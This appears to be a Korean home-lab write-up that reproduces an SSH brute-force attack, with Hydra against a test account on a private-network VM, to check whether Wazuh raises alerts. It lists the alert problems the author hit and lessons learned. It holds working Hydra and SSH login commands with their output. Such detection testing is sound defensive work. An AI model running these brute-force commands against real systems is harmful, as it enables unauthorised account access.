## 공격 재현

### Step 1 — 테스트 계정 생성 (Rocky Linux)

```bash
sudo useradd testuser
echo "testuser:test123" | sudo chpasswd
```

### Step 2 — Hydra 브루트포스 (Kali)

```bash
echo -e "wrong1\nwrong2\nwrong3\nwrong4\nwrong5\ntest123" > /tmp/shortlist.txt
hydra -l testuser -P /tmp/shortlist.txt 192.168.190.128 ssh -t 1
```

결과:
```
[22][ssh] host: 192.168.190.128   login: testuser   password: test123
1 of 1 target successfully completed
```

### Step 3 — 횡적이동 (Kali)

```bash
ssh testuser@192.168.190.128
# 비밀번호: test123
```

결과:
```
[testuser@localhost ~]$  ← 접속 성공
```

## 이슈 및 해결

| 이슈 | 원인 | 해결 |
|------|------|------|
| 알럿 미생성 | Wazuh Agent 다운 | `sudo systemctl start wazuh-agent` |
| 알럿 미생성 | 시도 횟수 부족 (1회) | 틀린 비밀번호 5개 + 맞는 비밀번호로 구성 |

## Lessons Learned

- Wazuh Agent 재부팅 후 자동 시작 설정 필요 (`systemctl enable wazuh-agent`)
- 브루트포스 탐지는 실패 횟수가 frequency 이상이어야 알럿 생성
- 실제 공격에서는 rockyou.txt 같은 대형 워드리스트 사용 → 복잡한 비밀번호 필수
